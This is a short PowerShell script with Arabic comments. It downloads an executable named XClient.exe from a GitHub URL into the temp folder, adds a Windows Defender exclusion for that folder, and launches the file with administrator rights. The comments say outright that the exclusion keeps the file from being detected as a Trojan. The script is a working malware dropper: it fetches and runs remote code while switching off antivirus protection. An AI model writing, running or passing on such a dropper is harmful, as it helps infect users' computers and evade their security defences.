# 1. تحميل الملف من السيرفر
$url = "https://github.com/DataMasr/te/raw/refs/heads/main/XClient.exe"
$exePath = "$env:TEMP\XClient.exe"
Invoke-WebRequest -Uri $url -OutFile $exePath

# 2. إضافة استثناء لـ Windows Defender (لتجنب اكتشافه كـ Trojan)
# هذا السطر يخبر الويندوز أن يثق في المجلد الموجود به الملف
Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue

# 3. تشغيل الملف بصلاحيات المسؤول (Administrator)
Start-Process -FilePath $exePath -Verb RunAs
